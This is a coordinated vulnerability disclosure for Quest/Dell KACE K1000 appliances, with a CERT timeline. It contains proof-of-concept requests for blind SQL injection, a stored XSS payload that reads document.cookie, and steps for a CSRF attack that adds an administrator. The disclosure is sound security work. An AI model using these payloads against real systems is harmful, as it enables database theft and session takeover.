@@ -1,0 +1,153 @@
+﻿# Exploit Title: [Dell Kace Appliance Multiple Vulnerabilities]
+# Date: [12/04/2018]
+# Exploit Author: [SlidingWindow],  Twitter: @kapil_khot
+# Vendor Homepage: [https://www.quest.com/products/kace-systems-management-appliance/]
+# Affected Versions: [KACE SMA versions prior to 9.0.270 PATCH SEC2018_20180410]
+# Tested on: [Quest Kace K1000 Appliance versions, 8.0.318, 8.0.320 and 9.0.270 ]
+# CVE : [CVE-2018-5404,CVE-2018-5405,CVE-2018-5406]
+#CERT Advisory: [https://www.kb.cert.org/vuls/id/877837/]
+#Vendor Advisory: https://support.quest.com/kb/288310/cert-coordination-center-report-update
+
+
+==================
+#Product:-
+==================
+Quest KACE, formerly Dell KACE, is a company that specializes in computer appliances for systems management of information technology equipment. It also provides software for security, application virtualization, and systems management products.
+
+==================
+#Vulnerability:-
+==================
+The Dell Kace K1000 Appliance (Now, Quest Kace K1000) suffers from several vulnerabilities such as Multiple Blind SQL Injection, Stored Cross-Site-Scripting, and mis-configured CORS.
+
+========================
+#Vulnerability Details:-
+========================
+
+=====================================================================================================================================================
+1. Blind SQL Injection Vulnerability in Ajax_Lookup_List.PHP (CVE-2018-5404)
+=====================================================================================================================================================
+
+The Dell Kace allows Admin users to access ajax_lookup_list.php. However, it can be accessed by a least privileged user with ‘User Console Only’ rights. Also, the user input supplied to 'selvalue' parameter is not sanitized that leads to a Blind SQL Injection vulnerability.
+
+#Proof-Of-Concept:
+------------------
+1. Send following request to the target:
+
+GET /common/ajax_lookup_list.php?query_type=submitter&parent_mapping=false&place_holder=Unassigned&suppress_place_holder_as_choice=false&selected=13&selvalue=13&queue_id=1&limit=10&org_id=1&locale=en_US&id=13 HTTP/1.1
+Host: 192.168.247.100
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.247.100/userui/ticket.php?QUEUE_ID=1
+Cookie: kbox_nav=1; KACE_LAST_USER=%98%B59%CB%D9%27f+%28%B6%83b%0F8a%EF; KACE_LAST_ORG=%DE%A3%0E20%8E%84%BF%B1%D5%89%E0%A8%E6%2A%FD; kboxid=i0b4qhnv66qg41893hb1q5g146; KACE_CSRF_TOKEN=4862fbb6808731e6658aeca4ea48bd2cac08502ca289e1d3305875b165fb2c86d5441145152ada3f3c701cf2387db6086e7c349c5265ec3b2110978a70ebde6f; KONEA=ebWI%2BP%2FFEgmTioFCZ3xVTgsN174jAtY0mkDdAov5uZtJEpn2FziBYMEinZsmN63zlNfEooUtIXJDgiJgmSKfFk3VvQguPiEAYQIaYpMhcFRQkfyANLWQy2tJzS8mByjYxJZlBRcYhJYlVqAMppyuikdVPOQRynpbiRNSIqVlX0wyxIBFaoF4b8O09p4wYkritpr1qM%2BMoLmA2n3%2BQCY2u%2FvD8DdrIVtm8t2%2BNxMVCCZjfpqpjKef73l7xx2yBxlV9kRG04gPNHXFfv8f4TZB82%2FvurTFqgOWThxp51YjdpWfssEJQsss1O1B3FtYEH0h83Wrl9ABzsRx%2FZafVGjQTw%3D%3D; x-dell-auth-jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJBTVNJZGVudGl0eVByb3ZpZGVyIiwic3ViIjozLCJhdWQiOiJFU01QbGF0Zm9ybSIsImNvbiI6IjRkMzkwY2M2ODMzZTRkMjk4MTI0NzYyYmQwYjdiNzRjIiwiZXhwIjoxNTIxMzA3NTExfQ.S9h0USN7xS0VmeapB6zWqKnAW-e-vd9J9-NrH9383gSXX6K_vEgXSv0FpuPGCtYQ2I3o7gxuYBKxy_qCqp1xd2w2NRowiZb5_WlwoHBWeTnaP3D9Y6Ek4nd9CKgPaZF1Y8TtaZkdbbWWFTdjtpkD3CK5eNHX_lsqtPD_gVJWwxc
+Connection: close
+
+2. Make a note of Content-Length in the response body.
+
+3. Send following request:
+
+http://192.168.247.100/common/ajax_lookup_list.php?query_type=submitter&parent_mapping=false&place_holder=Unassigned&suppress_place_holder_as_choice=false&selected=13&selvalue=13'&queue_id=1&limit=10&org_id=1&locale=en_US&id=13
+
+4. Response to above request shows that an error occurred and we are being redirected to /common/error.php
+
+5. Final payload to check if we get the original response back:
+
+http://192.168.247.100/common/ajax_lookup_list.php?query_type=submitter&parent_mapping=false&place_holder=Unassigned&suppress_place_holder_as_choice=false&selected=13&selvalue=13''&queue_id=1&limit=10&org_id=1&locale=en_US&id=13
+
+6. These tests confirm that the 'selvalue' parameter is indeed vulnerable to Blind SQL Injection. This can further be exploited by modifying the payload or using SQLMap to retrieve some sensitive information from the database.
+
+
+
+=========================================================================================================================================================
+2. Blind SQL Injection Vulnerability in Oval_Detail.PHP (CVE-2018-5404)
+=========================================================================================================================================================
+
+The Dell Kace allows Admin users to view OVAL templates via 'oval_detail.php', that can be accessed by a user with ‘Read Only Administrator’ rights. Also, the user input supplied to ID parameter is not sanitized that leads to a Blind SQL Injection vulnerability.
+An authenticated user with ‘Read Only Administrator’ rights could exploit this vulnerability to retrieve sensitive information from the database.
+
+#Proof-Of-Concept:
+------------------
+1. Send following request to the target:
+
+GET /adminui/oval_detail.php?ID=6200 HTTP/1.1
+Host: 192.168.247.100
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.247.100/adminui/oval_list.php
+Cookie: kbox_nav=1; KACE_LAST_USER=%9A%95%91%5E%AF%B2%A6%FA%02M%B5%7D%08%87%D52; KACE_LAST_ORG=%DE%A3%0E20%8E%84%BF%B1%D5%89%E0%A8%E6%2A%FD; kboxid=i48m8gm8kcnbiptc28pq8u7uq1; KACE_CSRF_TOKEN=96acbdac36b0143958a7d96ba318eb5c626884d46733a8ed05c88cfe94d80cfdebe6bd9790ff4fec3a79fa988ff828dac4d841356c72eebb015d20c5ffd5a01a; KONEA=xvqV3k6fWuhsnypD45pPw4OPs7fZxUDP24mubodoYiSj8Y8EqJpUnakrq%2BHEefSs0YkzglNboWvUhE%2FuavTZZrkyNPMF1IH2QB%2FIF7jSm6fLukuuMyLgTFZWtOg16t5eJqCXvn0f54tfwFnfB1tobY%2Fu6MDe8BOWKaj6mByvdD6kNREg%2B%2FLwAcfIYmgJNKYu0Wd9JwsRpWpuRyZkejbrZB%2FSlkh80oHvHSey0inQmIy7B4bYnPCPUfTU8qPeZLaPcvYFchruj%2BabBazlHAaq44txeUy2AtG85ntiN8XPXoZnflHOD%2B5WjTywTtRGiRpCQVQNDbHTOdSUuljpDEyjrw%3D%3D; x-dell-auth-jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJBTVNJZGVudGl0eVByb3ZpZGVyIiwic3ViIjo0LCJhdWQiOiJFU01QbGF0Zm9ybSIsImNvbiI6ImVlMTk3ZGE5NmFmYTRiYzViYzk5Y2VhMzI3ZjQ2OTdiIiwiZXhwIjoxNTIxMjk3MzE5fQ.GHuAWu_mcviKl0HQcFjY0In5aJxgB-WZCaHP5XQMdpdboby0b1qnwh4DyC3TQg4PktBm_D0Vu4LOMY5KWGRvwOQCTwrzBFLg3ogsKWb0AMO3RArrENXxEO3P3K6XFQCEIlpU9n9K1APnnRSTsfPEL7GC5GkzixakXAlZMZzLB_0
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+2. Response to above request shows some content with the content length of 32109 bytes:
+
+3. It shows information about OVAL-ID#24253:
+
+4. Now send following payload that tests this ID parameter for a true condition:
+
+	http://192.168.247.100/adminui/oval_detail.php?ID=6200+AND+6432=6432
+
+5. Response to above request again shows information about the same OVAL-ID#24252:
+
+6. Now, use following payload to test this ID parameter for a false condition:
+	
+	http://192.168.247.100/adminui/oval_detail.php?ID=6200+AND+6432=6444
+
+7. The response to false condition is different than the response to normal and/or true condition. This response does not show any information about any OVAL-ID:
+
+8. These tests confirm that the ID parameter is indeed vulnerable to Blind SQL Injection. This can further be exploited by modifying the payload or using SQLMap to retrieve some sensitive information from the database.
+
+=========================================================================================================================================================
+3. Stored Cross Site Scripting (XSS) Vulnerability (CVE-2018-5405)
+=========================================================================================================================================================
+
+The Dell Kace K1000 fails to sanitize user input when creating a ticket. A least privileged user with ‘User Console Only’ rights could exploit this vulnerability to inject arbitrary JavaScript while creating tickets that would be executed when administrators or any other user view these tickets.
+An authenticated least privileged user with ‘User Console Only’ rights to inject arbitrary JavaScript code on the tickets page. This script executes every time a user visits this page. This allows a malicious user of the system to steal session cookies of other users including Administrator and take over their session. This can further be exploited to launch other attacks.
+
+#Proof-Of-Concept:
+------------------
+1. Log into the Dell Kace K1000 web interface as a least privileged user.
+2. Navigate to Service Desk-->Tickets and create a new ticket.
+3. Inject following payload in the Summary section:
+	
+	Test Ticket</textarea></div></div><script>alert("XSSinSummary");alert(document.cookie);</script><!--
+
+4. Save the ticket.
+5. Go back to tickets and view this newly created ticket and a couple of alert boxes should pop up.
+6. Any user, including administrator visiting this ticket page would execute the injected script.
+
+
+=========================================================================================================================================================
+4. Misconfigured CORS Vulnerability (CVE-2018-5406)
+=========================================================================================================================================================
+
+The Dell Kace K1000 fails to implement Cross Origin Resource Sharing (CORS) properly, that leads to a Cross Site Request Forgery (CSRF) attack.
+
+An unauthenticated, remote attacker could exploit this vulnerability to perform sensitive actions such as adding a new administrator account or changing appliance’s settings. Also, malicious internal user of the organization could induce an administrator of this appliance to visit a malicious link that exploits this vulnerability to perform sensitive actions such as adding a new administrator account or changing appliance’s settings.
+
+
+#Proof-Of-Concept:
+------------------
+1. Try to create a new user and capture the request in BurpSuite to create a CSRF PoC from there. Create an HTML form and put it under Web Root of your Kali machine. 
+2. Log into the web interface of the appliance as admin.
+3. Open a new tab in the same browser and access the HTML page from #1
+4. Save the ticket.
+5. Submit the request (This can be modified to submit the request automatically).
+6. Check BurpSuite to see if the request to add user ‘Hacker’ was sent to the appliance and if it was originated from your Kali machine
+7. Check the admin console to see if user Hacker has been added:
+
+===================================
+#Vulnerability Disclosure Timeline:
+===================================
+
+04/2018: Submitted report to CERT-US.
+04/2018: CERT-US reported the issue to vendor.
+05/2018: Awaiting vendor response.
+10/2018: Vendor asked to test the patch as they have fixed these issues already.
+10/2018: Confirmed that all the vulnerabilities except Vulnerability#2 is fixed in 9.0.270 and still exists in other patched version.
+01/2019: Vendor confirmed that they are working on fixing all of the vulnerabilities and would release a patch on May 01 2019 and asked to publish this on June 01 2019 so that customers have enough time to patch.
+05/2019: Vendor published an advisory.
+06/2019: CERT-US published a Vulnerability Note, VU#877837.
